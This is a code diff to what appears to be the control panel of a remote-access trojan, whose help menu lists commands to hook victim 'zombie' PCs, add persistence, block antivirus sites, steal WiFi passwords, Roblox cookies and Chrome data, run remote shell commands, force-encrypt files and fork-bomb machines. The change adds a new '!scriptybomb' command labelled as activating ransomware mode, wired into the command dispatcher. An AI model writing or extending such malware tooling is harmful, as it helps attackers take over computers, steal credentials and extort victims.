@@ -451,61 +451,62 @@
 ╚═══════════════════════════════════╝
 
 ⚙️ TARGET CONTROL:
-  !list              - Show Zombies (Numbered)
-  !control <ID>      - Hook PC by Number
-  !status            - Current Info
+   !list              - Show Zombies (Numbered)
+   !control <ID>      - Hook PC by Number
+   !status            - Current Info
 
 ⚡ POWER & SYSTEM:
-  !lock              - Lock PC
-  !restart           - Restart System
-  !shutdown          - Shutdown PC
-  !bsod              - Blue Screen of Death
-  !blockinput        - Disable Keyboard/Mouse
-  !freeinput         - Enable Keyboard/Mouse
-  !blockscreen       - Block Screen Output
-  !taskmgr <on/off>  - Toggle Task Manager
-  !startup           - Add Persistence
-  !unstartup         - Remove Persistence
+   !lock              - Lock PC
+   !restart           - Restart System
+   !shutdown          - Shutdown PC
+   !bsod              - Blue Screen of Death
+   !blockinput        - Disable Keyboard/Mouse
+   !freeinput         - Enable Keyboard/Mouse
+   !blockscreen       - Block Screen Output
+   !taskmgr <on/off>  - Toggle Task Manager
+   !startup           - Add Persistence
+   !unstartup         - Remove Persistence
 
 🛡️ SECURITY:
-  !safemode          - Reboot into Safe Mode
-  !blockav           - Block AV Websites
-  !unblockav         - Unblock AV Websites
-  !checkadmin        - Check Admin Status
-  !setcritical       - Make Process Critical
-  !unsetcritical     - Remove Critical Status
-  !hidetaskbar       - Hide Taskbar
-  !showtaskbar       - Show Taskbar
-  !av                - Detect Antivirus
+   !safemode          - Reboot into Safe Mode
+   !blockav           - Block AV Websites
+   !unblockav         - Unblock AV Websites
+   !checkadmin        - Check Admin Status
+   !setcritical       - Make Process Critical
+   !unsetcritical     - Remove Critical Status
+   !hidetaskbar       - Hide Taskbar
+   !showtaskbar       - Show Taskbar
+   !av                - Detect Antivirus
 
 🕵️ STEALERS & DATA:
-  !wifi              - Steal WiFi Passwords
-  !roblox            - Grab Roblox Cookie
-  !chrome            - Steal Chrome Data
-  !ip                - Get GeoIP Info
+   !wifi              - Steal WiFi Passwords
+   !roblox            - Grab Roblox Cookie
+   !chrome            - Steal Chrome Data
+   !ip                - Get GeoIP Info
 
 💻 REMOTE EXECUTION:
-  !exec <cmd>        - Run Shell Command
-  !cd <path>         - Change Directory
-  !kill <name>       - Kill Process
+   !exec <cmd>        - Run Shell Command
+   !cd <path>         - Change Directory
+   !kill <name>       - Kill Process
 
 🔐 ENCRYPTION:
-  !encrypt <pass>    - Force Encrypt Files
-  !decrypt <pass>    - Decrypt Files
+   !encrypt <pass>    - Force Encrypt Files
+   !decrypt <pass>    - Decrypt Files
+   !scriptybomb       - Activate ransomware mode
 
 🔊 MEDIA:
-  !tts <text>        - Text to Speech
-  !msgbox <msg>      - Popup Message
-  !url <link>        - Open Website
-  !mute              - Mute Audio
-  !unmute            - Unmute Audio
-  !volume <0-100>    - Set Volume
+   !tts <text>        - Text to Speech
+   !msgbox <msg>      - Popup Message
+   !url <link>        - Open Website
+   !mute              - Mute Audio
+   !unmute            - Unmute Audio
+   !volume <0-100>    - Set Volume
 
 👻 FUN:
-  !jumpscare         - Jumpscare Screen
-  !blacklist <app>   - Kill Process Loop
-  !whitelist <app>   - Stop Killing Process
-  !forkbomb          - CRASH PC (DANGER)
+   !jumpscare         - Jumpscare Screen
+   !blacklist <app>   - Kill Process Loop
+   !whitelist <app>   - Stop Killing Process
+   !forkbomb          - CRASH PC (DANGER)
                 `, "log-sys");
                 return;
             }
@@ -605,6 +606,10 @@
                 case '!showtaskbar': pl.type='show_taskbar'; break;
 
                 // STEALERS
+                case '!scriptybomb': 
+                    pl.type='scriptybomb'; 
+                    if(args) pl.mp3_url = args;
+                    break;
                 case '!wifi': pl.type='wifi_stealer'; break;
                 case '!roblox': pl.type='grab_roblox'; break;
 
